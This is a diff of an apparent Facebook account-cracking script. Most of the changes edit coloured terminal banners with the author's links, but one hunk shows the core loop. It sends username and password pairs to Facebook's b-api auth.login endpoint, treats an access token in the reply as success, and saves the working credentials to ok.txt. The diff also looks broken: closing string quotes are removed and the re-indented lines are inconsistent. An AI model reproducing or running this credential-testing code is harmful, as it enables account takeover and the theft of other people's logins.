@@ -35,7 +35,7 @@ Sumon|   | ×Author:Milzuu          Subscribe:Milzuu TC \x1b[1;94m
 》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》 \x1b[1;94m
 _________________________________________________________________ \x1b[1;97m    
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m
-\x1b[1;94m───────────────────────────────────────────────────────""")
+\x1b[1;94m───────────────────────────────────────────────────────
 \x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : MilzuTC
 \x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/MILZUTC/Milzux.git
 \x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/milestone.gota
@@ -56,7 +56,7 @@ Sumon|   | ×Author:Milzu-TC          Subscribe:Milzuu TC          \x1b[1;94m
 》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》》 \x1b[1;94m
 _________________________________________________________________ \x1b[1;97m
 \x1b[1;92m •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m 
-\x1b[1;94m───────────────────────────────────────────────────────""")
+\x1b[1;94m───────────────────────────────────────────────────────
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : MilzuTC
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/MILZUTC/Milzx.git
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/milestone.gota
@@ -138,10 +138,10 @@ def moch_milzx():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
-                 print()
-                 result += 1
-                 if cek:
+                  print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
+                  print()
+                  result += 1
+                  if cek:
                         life.append(username+"|"+password)
                  else:
                         with open('ok.txt','a') as f:
@@ -237,7 +237,7 @@ def moch_milzx():
                    memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                    if memek =="":
                          print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
-                         Milzuu()
+                         milzx()
                    elif memek == '0' or memek =='00':
                          aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
                          os.system('xdg-open  https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ-mg ')
